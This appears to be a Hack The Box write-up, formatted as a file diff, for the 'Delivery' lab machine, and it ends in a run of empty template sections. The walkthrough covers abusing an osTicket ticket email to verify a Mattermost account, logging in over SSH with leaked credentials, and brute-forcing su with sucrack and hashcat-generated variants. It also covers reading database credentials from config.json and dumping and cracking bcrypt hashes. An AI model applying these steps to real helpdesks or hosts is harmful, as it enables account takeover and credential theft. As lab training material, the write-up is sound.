@@ -1,0 +1,677 @@
+Delivery - Hack The Box - Easy Linux - Logic Flaw 2 Apps MatterMost and HelpDesk
+
+Debian Box, Debian 10 based on Banner.
+
+If we look at the source code it hostname is helpdesk.delivery.htb
+We add this to our hosts file
+
+Once we add this to our /etc/hosts file we can navigate to the mattermost server on delivery.htb 
+http://delivery.htb:8065/login
+which presents us with a login prompt
+
+Likewise on the http://helpdesk.delivery.htb/
+We get a support center ticket system that has a sign in for an email and password.
+We can also open tickets.
+It is running OS Ticket, we can go online and search for the github and look at the files that maybe installed. We see a readme
+https://github.com/osTicket/osTicket
+in the github and specify it.
+http://helpdesk.delivery.htb/README.md
+We get a:
+"File not found. "
+
+There is a "web.config" we may be able to access:
+http://helpdesk.delivery.htb/web.config
+
+And indeed we are able to download the file. We see no info on the version based on the web.config contents.
+So we look at searchsploit for osticket and see if there any exploits at all.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/delivery]
+└──╼ $searchsploit osticket
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+osTicket - 'l.php?url' Arbitrary Site Redirect                                                          | php/webapps/38161.txt
+osTicket - 'tickets.php?status' Cross-Site Scripting                                                    | php/webapps/38162.txt
+osTicket 1.10 - SQL Injection (PoC)                                                                     | php/webapps/42660.txt
+osTicket 1.10.1 - Arbitrary File Upload                                                                 | windows/webapps/45169.txt
+osTicket 1.11 - Cross-Site Scripting / Local File Inclusion                                             | php/webapps/46753.txt
+osTicket 1.12 - Formula Injection                                                                       | php/webapps/47225.txt
+osTicket 1.12 - Persistent Cross-Site Scripting                                                         | php/webapps/47226.txt
+osTicket 1.12 - Persistent Cross-Site Scripting via File Upload                                         | php/webapps/47224.txt
+osTicket 1.14.1 - 'Saved Search' Persistent Cross-Site Scripting                                        | php/webapps/48525.txt
+osTicket 1.14.1 - 'Ticket Queue' Persistent Cross-Site Scripting                                        | php/webapps/48524.txt
+osTicket 1.14.1 - Persistent Authenticated Cross-Site Scripting                                         | php/webapps/48413.txt
+osTicket 1.14.2 - SSRF                                                                                  | php/webapps/49441.txt
+osTicket 1.2/1.3 - 'view.php?inc' Arbitrary Local File Inclusion                                        | php/webapps/25926.txt
+osTicket 1.2/1.3 - Multiple Input Validation / Remote Code Injection Vulnerabilities                    | php/webapps/25590.txt
+osTicket 1.2/1.3 Support Cards - 'view.php' Cross-Site Scripting                                        | php/webapps/29298.txt
+osTicket 1.6 RC4 - Admin Login Blind SQL Injection                                                      | php/webapps/9032.txt
+osTicket 1.6 RC5 - Multiple Vulnerabilities                                                             | php/webapps/11380.txt
+osTicket 1.9.14 - 'X-Forwarded-For' Cross-Site Scripting                                                | php/webapps/40826.py
+osTicket 1.x - 'Open_form.php' Remote File Inclusion                                                    | php/webapps/27928.txt
+osTicket STS 1.2 - Attachment Remote Command Execution                                                  | php/webapps/24225.php
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+==================================================================================================================================
+
+We have a lot of exploits available. We can even get dates if we output with "-j" flag which stands for json data.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/delivery]
+└──╼ $searchsploit osticket -j | jq
+{
+  "SEARCH": "osticket",
+  "DB_PATH_EXPLOIT": "/usr/share/exploitdb",
+  "RESULTS_EXPLOIT": [
+    {
+      "Title": "osTicket - 'l.php?url' Arbitrary Site Redirect",
+      "EDB-ID": "38161",
+      "Date": "2013-01-02",
+      "Author": "AkaStep",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/38161.txt"
+    },
+    {
+      "Title": "osTicket - 'tickets.php?status' Cross-Site Scripting",
+      "EDB-ID": "38162",
+      "Date": "2013-01-02",
+      "Author": "AkaStep",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/38162.txt"
+    },
+    {
+      "Title": "osTicket 1.10 - SQL Injection (PoC)",
+      "EDB-ID": "42660",
+      "Date": "2017-09-12",
+      "Author": "Mehmet Ince",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/42660.txt"
+    },
+    {
+      "Title": "osTicket 1.10.1 - Arbitrary File Upload",
+      "EDB-ID": "45169",
+      "Date": "2018-08-08",
+      "Author": "Rajwinder Singh",
+      "Type": "webapps",
+      "Platform": "windows",
+      "Path": "/usr/share/exploitdb/exploits/windows/webapps/45169.txt"
+    },
+    {
+      "Title": "osTicket 1.11 - Cross-Site Scripting / Local File Inclusion",
+      "EDB-ID": "46753",
+      "Date": "2019-04-25",
+      "Author": "AkkuS",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/46753.txt"
+    },
+    {
+      "Title": "osTicket 1.12 - Formula Injection",
+      "EDB-ID": "47225",
+      "Date": "2019-08-12",
+      "Author": "Aishwarya Iyer",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/47225.txt"
+    },
+    {
+      "Title": "osTicket 1.12 - Persistent Cross-Site Scripting via File Upload",
+      "EDB-ID": "47224",
+      "Date": "2019-08-12",
+      "Author": "Aishwarya Iyer",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/47224.txt"
+    },
+    {
+      "Title": "osTicket 1.12 - Persistent Cross-Site Scripting",
+      "EDB-ID": "47226",
+      "Date": "2019-08-12",
+      "Author": "Aishwarya Iyer",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/47226.txt"
+    },
+    {
+      "Title": "osTicket 1.14.1 - 'Saved Search' Persistent Cross-Site Scripting",
+      "EDB-ID": "48525",
+      "Date": "2020-05-27",
+      "Author": "Matthew Aberegg",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/48525.txt"
+    },
+    {
+      "Title": "osTicket 1.14.1 - 'Ticket Queue' Persistent Cross-Site Scripting",
+      "EDB-ID": "48524",
+      "Date": "2020-05-27",
+      "Author": "Matthew Aberegg",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/48524.txt"
+    },
+    {
+      "Title": "osTicket 1.14.1 - Persistent Authenticated Cross-Site Scripting",
+      "EDB-ID": "48413",
+      "Date": "2020-05-04",
+      "Author": "Mehmet Kelepçe",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/48413.txt"
+    },
+    {
+      "Title": "osTicket 1.14.2 - SSRF",
+      "EDB-ID": "49441",
+      "Date": "2021-01-19",
+      "Author": "Talat Mehmood",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/49441.txt"
+    },
+    {
+      "Title": "osTicket 1.2/1.3 - 'view.php?inc' Arbitrary Local File Inclusion",
+      "EDB-ID": "25926",
+      "Date": "2005-06-30",
+      "Author": "edisan & foster",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/25926.txt"
+    },
+    {
+      "Title": "osTicket 1.2/1.3 - Multiple Input Validation / Remote Code Injection Vulnerabilities",
+      "EDB-ID": "25590",
+      "Date": "2005-05-03",
+      "Author": "GulfTech Security",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/25590.txt"
+    },
+    {
+      "Title": "osTicket 1.2/1.3 Support Cards - 'view.php' Cross-Site Scripting",
+      "EDB-ID": "29298",
+      "Date": "2006-12-19",
+      "Author": "Hacker CooL",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/29298.txt"
+    },
+    {
+      "Title": "osTicket 1.6 RC4 - Admin Login Blind SQL Injection",
+      "EDB-ID": "9032",
+      "Date": "2009-06-29",
+      "Author": "Adam Baldwin",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/9032.txt"
+    },
+    {
+      "Title": "osTicket 1.6 RC5 - Multiple Vulnerabilities",
+      "EDB-ID": "11380",
+      "Date": "2010-02-09",
+      "Author": "Nahuel Grisolia",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/11380.txt"
+    },
+    {
+      "Title": "osTicket 1.9.14 - 'X-Forwarded-For' Cross-Site Scripting",
+      "EDB-ID": "40826",
+      "Date": "2016-11-24",
+      "Author": "Joaquin Ramirez Martinez",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/40826.py"
+    },
+    {
+      "Title": "osTicket 1.x - 'Open_form.php' Remote File Inclusion",
+      "EDB-ID": "27928",
+      "Date": "2006-05-31",
+      "Author": "Sweet",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/27928.txt"
+    },
+    {
+      "Title": "osTicket STS 1.2 - Attachment Remote Command Execution",
+      "EDB-ID": "24225",
+      "Date": "2004-06-21",
+      "Author": "Guy Pearce",
+      "Type": "webapps",
+      "Platform": "php",
+      "Path": "/usr/share/exploitdb/exploits/php/webapps/24225.php"
+    }
+  ],
+  "DB_PATH_SHELLCODE": "/usr/share/exploitdb",
+  "RESULTS_SHELLCODE": [],
+  "DB_PATH_PAPER": "/usr/share/exploitdb-papers",
+  "RESULTS_PAPER": []
+}
+==================================================================================================================================
+
+We are looking for new exploits so the search is for 2020 and 2021 years from which the exploits were uploaded.
+Most are css and ssrf.
+What we can do now do is just open a new ticket and see if we can abuse the application.
+
+So we create a ticket with a fake email and name and the insert a link address with out ip address
+http://10.10.14.18/testing
+
+We get confirmation that the support ticket was created with the following page after submitting
+Commands and Output:
+==================================================================================================================================
+ajashshs, 
+
+You may check the status of your ticket, by navigating to the Check Status page using ticket id: 1227784.
+
+If you want to add more information to your ticket, just email 1227784@delivery.htb.
+
+Thanks,
+
+Support Team
+==================================================================================================================================
+
+The key for this is the new email that was just created. We get the same domain as the corporation.
+Remember the email you used for the ticket (i.e. dumb@dumb.com)
+http://helpdesk.delivery.htb/view.php
+
+After entering the ticket number and the email, we get redirected to the following page.
+http://helpdesk.delivery.htb/tickets.php 
+
+Now what we can do is go to the mattermost server and create an account using the email that we were given.
+http://delivery.htb:8065/signup_email
+
+Username: hacker password: 1227784*Ag
+
+After creating the account we must verify since, we have access to email that was created just for the ticket by the corporation
+we should have access to it on the server in the ticket.php page after refreshing.
+
+We get the following text
+Commands and Output:
+==================================================================================================================================
+ajashshs posted 5/22/21 10:03 PM
+---- Registration Successful ---- Please activate your email by going to:
+http://delivery.htb:8065/do_verify_email?token=sndehdemrd5hti73soifkd1nbnu9frca1timhi8swn4wqc5s89am5ph5kne61r9d&email=1227784%40delivery.htb ) 
+--------------------- You can sign in from: --------------------- Mattermost lets you share messages and files from your PC or phone,
+with instant search and archiving. For the best experience, download the apps for PC, Mac, iOS and Android from: 
+https://mattermost.com/download/#mattermostApps ( https://mattermost.com/download/#mattermostApps
+==================================================================================================================================
+
+Specifying the url redirects us to the following link location, which just requires password verification.
+http://delivery.htb:8065/login?extra=verified&email=1227784%40delivery.htb
+
+Commands and Output:
+==================================================================================================================================
+Mattermost
+All team communication in one place, searchable and accessible anywhere
+Email Verified
+==================================================================================================================================
+
+We get asked to what team we want to join and login with Mattermost, we see a message from root.
+Commands and Output:
+==================================================================================================================================
+System
+2:25 PM
+
+@root joined the team.
+System
+2:28 PM
+@root updated the channel display name from: Town Square to: Internal
+root
+2:29 PM
+
+@developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail! 
+
+Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
+root
+3:58 PM
+
+PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
+==================================================================================================================================
+
+Based on the message board text we will most likley have to use hashcat to crack hashes to get to root or other users.
+We can now use the creds that were provided to login to the system via ssh. 
+AND we get in.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/delivery]
+└──╼ $ssh maildeliverer@10.10.10.222
+The authenticity of host '10.10.10.222 (10.10.10.222)' can't be established.
+ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.222' (ECDSA) to the list of known hosts.
+maildeliverer@10.10.10.222's password: 
+Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
+maildeliverer@Delivery:~$ ls
+user.txt
+==================================================================================================================================
+
+First we will want to see which users have shell access on the box. Mattermost seems like the most likley target.
+Commands and Output:
+==================================================================================================================================
+maildeliverer@Delivery:/home$ cat /etc/passwd | grep -v "false\|nologin"
+root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
+maildeliverer:x:1000:1000:MailDeliverer,,,:/home/maildeliverer:/bin/bash
+mattermost:x:998:998::/home/mattermost:/bin/sh
+==================================================================================================================================
+
+2 Ways to root box, skip going to database to get a hash by doing the following. We will use the "PleaseSubscribe!" string to make
+hashcat variations of the string using a variety of rules.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/delivery]
+└──╼ $echo "PleaseSubscribe!" > pw
+┌─[user@parrot-virtual]─[~/htb/delivery]
+└──╼ $hashcat --stdout pw -r /usr/share/hashcat/rules/best64.rule > pwlist
+==================================================================================================================================
+
+This makes 64 different variations of the password. How do we use it? We could use hydra and perform bruteforce attack using the list
+but sometimes root is not allowed to login. We want to focus on the mattermost account and root.
+
+We want to use sucrack , which will brute force with the program su.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[/opt]
+└──╼ $sudo git clone https://github.com/hemp3l/sucrack.git
+┌─[user@parrot-virtual]─[/opt/sucrack]
+└──╼ $sudo ./configure 
+==================================================================================================================================
+
+We now copy the sucrack, but if you get make error run the following
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[/opt/sucrack]
+└──╼ $sudo autoreconf -f -i
+configure.ac:9: warning: AC_ARG_PROGRAM was called before AC_CANONICAL_TARGET
+../../lib/autoconf/general.m4:1844: AC_CANONICAL_TARGET is expanded from...
+configure.ac:9: the top level
+configure.ac:9: warning: AC_ARG_PROGRAM was called before AC_CANONICAL_TARGET
+../../lib/autoconf/general.m4:1844: AC_CANONICAL_TARGET is expanded from...
+configure.ac:9: the top level
+configure.ac:9: warning: AC_ARG_PROGRAM was called before AC_CANONICAL_TARGET
+../../lib/autoconf/general.m4:1844: AC_CANONICAL_TARGET is expanded from...
+configure.ac:9: the top level
+configure.ac:9: warning: AC_ARG_PROGRAM was called before AC_CANONICAL_TARGET
+../../lib/autoconf/general.m4:1844: AC_CANONICAL_TARGET is expanded from...
+configure.ac:9: the top level
+configure.ac:9: warning: AC_ARG_PROGRAM was called before AC_CANONICAL_TARGET
+../../lib/autoconf/general.m4:1844: AC_CANONICAL_TARGET is expanded from...
+configure.ac:9: the top level
+┌─[user@parrot-virtual]─[/opt/sucrack]
+└──╼ $sudo make
+==================================================================================================================================
+
+We can now copy the sucrack binary to our machine directory. We hosts sucrack and pwlist. ANd download both binary and pwlist to
+/dev/shm.
+
+We can now run sucrack on the server and see if root or mattermost can be cracked.
+Commands and Output:
+==================================================================================================================================
+maildeliverer@Delivery:/dev/shm$ ./sucrack -a -w 20 -s 10 -u root -r pwlist
+-a option not available. Use the --enable-statistics configure flag
+-s option not available. Use the --enable-statistics configure flag
+password is: PleaseSubscribe!21
+==================================================================================================================================
+
+That is one way to do the box, a second way is to use hashcat and look at mattermost.
+We look at /opt/mattermost/config and in the config.json we see the following
+Commands and Output:
+==================================================================================================================================
+  "SqlSettings": {
+        "DriverName": "mysql",
+        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
+==================================================================================================================================
+
+We can now mysql to look at the databse with the creds we just found.
+Commands and Output:
+==================================================================================================================================
+maildeliverer@Delivery:/opt/mattermost$ mysql -u mmuser -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 87
+Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]>
+==================================================================================================================================
+
+We login to the database
+Commands and Output:
+==================================================================================================================================
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mattermost         |
++--------------------+
+2 rows in set (0.001 sec)
+
+MariaDB [(none)]> use mattermost;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [mattermost]> show tables;
++------------------------+
+| Tables_in_mattermost   |
++------------------------+
+| Audits                 |
+| Bots                   |
+| ChannelMemberHistory   |
+| ChannelMembers         |
+| Channels               |
+| ClusterDiscovery       |
+| CommandWebhooks        |
+| Commands               |
+| Compliances            |
+| Emoji                  |
+| FileInfo               |
+| GroupChannels          |
+| GroupMembers           |
+| GroupTeams             |
+| IncomingWebhooks       |
+| Jobs                   |
+| Licenses               |
+| LinkMetadata           |
+| OAuthAccessData        |
+| OAuthApps              |
+| OAuthAuthData          |
+| OutgoingWebhooks       |
+| PluginKeyValueStore    |
+| Posts                  |
+| Preferences            |
+| ProductNoticeViewState |
+| PublicChannels         |
+| Reactions              |
+| Roles                  |
+| Schemes                |
+| Sessions               |
+| SidebarCategories      |
+| SidebarChannels        |
+| Status                 |
+| Systems                |
+| TeamMembers            |
+| Teams                  |
+| TermsOfService         |
+| ThreadMemberships      |
+| Threads                |
+| Tokens                 |
+| UploadSessions         |
+| UserAccessTokens       |
+| UserGroups             |
+| UserTermsOfService     |
+| Users                  |
++------------------------+
+46 rows in set (0.001 sec)
+
+==================================================================================================================================
+
+We now have access to the mattermost database and inquire about the users database using describe
+Commands and Output:
+==================================================================================================================================
+MariaDB [mattermost]> describe Users;
++--------------------+--------------+------+-----+---------+-------+
+| Field              | Type         | Null | Key | Default | Extra |
++--------------------+--------------+------+-----+---------+-------+
+| Id                 | varchar(26)  | NO   | PRI | NULL    |       |
+| CreateAt           | bigint(20)   | YES  | MUL | NULL    |       |
+| UpdateAt           | bigint(20)   | YES  | MUL | NULL    |       |
+| DeleteAt           | bigint(20)   | YES  | MUL | NULL    |       |
+| Username           | varchar(64)  | YES  | UNI | NULL    |       |
+| Password           | varchar(128) | YES  |     | NULL    |       |
+| AuthData           | varchar(128) | YES  | UNI | NULL    |       |
+| AuthService        | varchar(32)  | YES  |     | NULL    |       |
+| Email              | varchar(128) | YES  | UNI | NULL    |       |
+| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |
+| Nickname           | varchar(64)  | YES  |     | NULL    |       |
+| FirstName          | varchar(64)  | YES  |     | NULL    |       |
+| LastName           | varchar(64)  | YES  |     | NULL    |       |
+| Position           | varchar(128) | YES  |     | NULL    |       |
+| Roles              | text         | YES  |     | NULL    |       |
+| AllowMarketing     | tinyint(1)   | YES  |     | NULL    |       |
+| Props              | text         | YES  |     | NULL    |       |
+| NotifyProps        | text         | YES  |     | NULL    |       |
+| LastPasswordUpdate | bigint(20)   | YES  |     | NULL    |       |
+| LastPictureUpdate  | bigint(20)   | YES  |     | NULL    |       |
+| FailedAttempts     | int(11)      | YES  |     | NULL    |       |
+| Locale             | varchar(5)   | YES  |     | NULL    |       |
+| Timezone           | text         | YES  |     | NULL    |       |
+| MfaActive          | tinyint(1)   | YES  |     | NULL    |       |
+| MfaSecret          | varchar(128) | YES  |     | NULL    |       |
++--------------------+--------------+------+-----+---------+-------+
+25 rows in set (0.001 sec)
+==================================================================================================================================
+
+We now can select both id username and passwords from the users table.
+Commands and Output:
+==================================================================================================================================
+MariaDB [mattermost]> select Id, Username, Password from Users;
++----------------------------+----------------------------------+--------------------------------------------------------------+
+| Id                         | Username                         | Password                                                     |
++----------------------------+----------------------------------+--------------------------------------------------------------+
+| 64nq8nue7pyhpgwm99a949mwya | surveybot                        |                                                              |
+| 6akd5cxuhfgrbny81nj55au4za | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
+| 6wkx1ggn63r7f8q1hpzp7t4iiy | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
+| dijg7mcf4tf3xrgxi5ntqdefma | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+| hatotzdacb8mbe95hm4ei8i7ny | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
+| jing8rk6mjdbudcidw6wz94rdy | channelexport                    |                                                              |
+| n9magehhzincig4mm97xyft9sc | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+| wdtgtdsjt7nu7ka9sz7i8fxjqy | hacker                           | $2a$10$1xH8eUwJb1cSQn1johnnA.djRrm5ulFIFs7a3scDgRSj8hx4MXkqi |
++----------------------------+----------------------------------+--------------------------------------------------------------+
+8 rows in set (0.001 sec)
+
+MariaDB [mattermost]> 
+==================================================================================================================================
+
+We get the hash for root, which we can now crack with hashcat. Bcrypt password hash. We can now use the previous pwlist we created
+and send the hash to hashcat to crack.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/delivery/www]
+└──╼ $hashcat -m 3200 hash.txt pwlist --force
+hashcat (v6.1.1) starting...
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 2890/2954 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 65 MB
+
+Dictionary cache built:
+* Filename..: pwlist
+* Passwords.: 77
+* Bytes.....: 1177
+* Keyspace..: 77
+* Runtime...: 0 secs
+
+$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
+==================================================================================================================================
+
+The password is cracked and we can login. We can learn more of how the box originally designed bby going to the following medium post
+https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
